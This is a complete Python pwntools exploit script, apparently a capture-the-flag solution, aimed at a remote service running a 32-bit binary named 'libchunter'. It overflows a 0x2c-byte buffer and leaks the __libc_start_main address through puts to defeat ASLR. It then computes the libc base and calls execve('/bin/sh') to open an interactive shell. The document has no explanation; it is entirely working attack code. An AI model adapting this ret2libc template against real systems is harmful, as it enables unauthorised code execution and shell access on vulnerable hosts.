from pwn import *

context(arch='i386')

io = remote("pwn1.0ops.sjtu.cn", 10009)

libc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')

elf = ELF('libchunter')

rep = 0x2c

io.recvuntil(b')\n')

payload = b'A' * rep + p32(elf.plt['puts']) + p32(0x080484E7) + p32(elf.got['__libc_start_main'])

io.sendline(payload)

__libc_start_main = u32(io.recv(4))

print( hex(__libc_start_main))

libc_base = __libc_start_main - libc.symbols['__libc_start_main']

bin_sh = libc.search(b'/bin/sh\x00').__next__() + libc_base

execve = libc.symbols['execve'] + libc_base

payload = b"A" * rep + p32(execve) + p32(0) + p32(bin_sh) + p32(0) + p32(0)

io.recvuntil(b')\n')

io.sendline(payload)

io.interactive()